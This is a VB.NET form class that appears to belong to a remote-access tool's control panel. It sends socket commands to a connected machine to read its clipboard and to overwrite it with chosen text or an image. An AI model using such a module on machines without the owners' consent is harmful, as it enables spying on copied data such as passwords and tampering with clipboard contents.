Public Class Clipboardmanager
    Public sock As Integer
    Dim clipimage As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + "SetClipImage.jpg"
    Private Sub getClip()
        Main.S.Send(sock, "getcli")
    End Sub

    Private Sub setClipboard(ByVal Setter As String)
        Main.S.Send(sock, "setcli" & Main.Yy & Setter)
    End Sub

    Private Sub SkyDarkButton1_Click(sender As System.Object, e As System.EventArgs)
        getClip()
    End Sub

    Private Sub SkyDarkButton2_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton2.Click
        getClip()
    End Sub






    '"setcliimg"
    Private Sub SkyDarkButton3_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton3.Click
        setClipboard(TextBox2.Text)
    End Sub

    Private Sub SkyDarkButton5_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton5.Click
        OpenFileDialog1.ShowDialog()
        OpenFileDialog1.Filter = "Bitmap|*.bmp|JPEG|*.jpg"
        If OpenFileDialog1.FileName.Length > 0 Then
            PictureBox2.Image = Image.FromFile(OpenFileDialog1.FileName)
            PictureBox2.Image.Save(clipimage)
        Else
            MsgBox("No Image Selected", MsgBoxStyle.Critical)
        End If
    End Sub

    Private Sub SkyDarkButton4_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton4.Click
        '
        If PictureBox2.Image Is Nothing Then
            MsgBox("No Image Selected", MsgBoxStyle.Critical)
            Exit Sub
        Else
            Main.S.Send(sock, "setcliimg" & Main.Yy & Convert.ToBase64String(IO.File.ReadAllBytes(clipimage)))
        End If
    End Sub
End Class